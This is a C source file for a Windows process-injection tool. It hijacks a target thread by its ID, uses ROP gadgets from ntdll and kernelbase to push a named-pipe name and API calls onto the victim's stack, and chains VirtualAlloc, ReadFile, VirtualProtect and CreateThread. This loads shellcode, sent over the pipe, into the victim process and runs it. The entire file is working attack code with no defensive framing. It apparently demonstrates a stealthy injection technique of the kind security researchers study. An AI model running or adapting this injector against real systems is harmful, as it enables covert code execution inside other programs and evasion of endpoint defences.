#include <windows.h>
#include <stdio.h>
#include "helpers.h"
#include "shellcode.h"
#define HEAP_ALLOC 0x1000 //how much mem to alloc on heap in victim
#define gpa(x, y) ((unsigned int)GetProcAddress(GetModuleHandleA(x), y))
int main(int argc, char** argv){
    //note: this name including null byte at end shld be a multiple of 4 bytes. makes the write to stack a little simpler later on
    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe";
    
    DWORD tid = atoi(argv[1]); //get thread id using args
    printf("Finding gadgets...\n");
    //find gadgets, using kernelbase.dll and ntdll.dll
    pshc=findr("\x52\xFF\xD0", 3, "ntdll.dll"); //push edx; call eax
    jmps=findr("\xEB\xFE", 2, "kernelbase.dll"); //jmp $
    ret=findr("\xC3", 1, "kernelbase.dll"); //ret
    if(pshc==0 | jmps==0 | ret==0){
        printf("Error! Gadgets could not be found!\n");
        return -1;
    }
    HANDLE thd = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE, tid);
    if(thd==NULL){
        printf("Error! Could not acquire handle!\n");
        return -1;
    }
    //set eip to a `jmp $`, blocks when kernel exit
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);
    unsigned int oeip = ctx.Eip;
    ctx.Eip = jmps;
    SetThreadContext(thd, &ctx);
    ctx.Eip = oeip;
    ResumeThread(thd);
    printf("Primed thread, waiting for kernel exit...\n");
    
    //wait for thread's user time to increase, signifying kernel exit
    waitunblock(thd);
    printf("Process exited kernel, ready for injection\n");
    
    DWORD t0 = GetTickCount();
    
    //push a junk val to stack, this is quite useless but it simplifies the code
    opening(thd);
    
    //inject the buffer
    int j;
    unsigned int namptr;
    for(j=sizeof(pipename);j>0;j-=4){
        unsigned int num = 0;
        memcpy(&num, pipename+j-4, 4);
        namptr = push(num);
    }
    printf("Pipe name injected to stack\n");
    //make our pipe    
    HANDLE pipe = CreateNamedPipe(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HEAP_ALLOC, 0, 5000, NULL);
    
    //connect victim process to pipe
    push(0);
    push(FILE_ATTRIBUTE_NORMAL);
    push(OPEN_EXISTING);
    push(0);
    push(FILE_SHARE_READ);
    push(GENERIC_READ);
    push(namptr);
    push(jmps);
    push(gpa("kernel32.dll", "CreateFileA"));
    
    //execute
    slay(thd);
    
    waitunblock(thd);
    unsigned int phand = getretpush(0, thd); //HANDLE object in victim process
    printf("Pipes connected\n");
    
    //push virtualalloc, alloc 1 page in RW in victim process
    push(PAGE_READWRITE);
    push(MEM_COMMIT);
    push(HEAP_ALLOC);
    push(0);
    push(jmps);
    push(gpa("kernelbase.dll", "VirtualAlloc"));
    
    //execute
    slay(thd);
    
    waitunblock(thd);
    unsigned int addr = getretpush(0, thd);
    printf("VirtualAlloc'd memory at 0x%x. Preparing ROP sled...\n", addr);
    
    //prepare ReadFile -> CloseHandle -> VirtualProtect -> CreateThread rop sled
    push(0);
    push(0);
    push(addr);
    push(0);
    push(0);
    push(jmps);
    push(gpa("kernel32.dll", "CreateThread"));
    
    push(namptr); //just use unused portion of stack for mandatory LPVOID
    push(PAGE_EXECUTE_READ);
    push(HEAP_ALLOC);
    push(addr);
    push(ret);
    push(gpa("kernelbase.dll", "VirtualProtect"));
    
    push(phand);
    push(ret);
    push(gpa("kernel32.dll", "CloseHandle"));
    
    //read bytes from pipe
    push(0);
    push(namptr); //same strat as VirtualProtect
    push(HEAP_ALLOC);
    push(addr);
    push(phand);
    push(ret);
    push(gpa("kernel32.dll", "ReadFile"));
    
    //write data to pipe
    DWORD bw;
    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);
    printf("Data written to pipe. Executing ROP sled...\n");
    slay(thd);
    printf("Waiting for shellcode thread creation...\n");
    waitunblock(thd);
    printf("Execution completed! Restoring original thread...\n");
    DisconnectNamedPipe(pipe);
    SuspendThread(thd);
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    printf("Full injection sequence done. Time elapsed: %dms\n", GetTickCount()-t0);
}
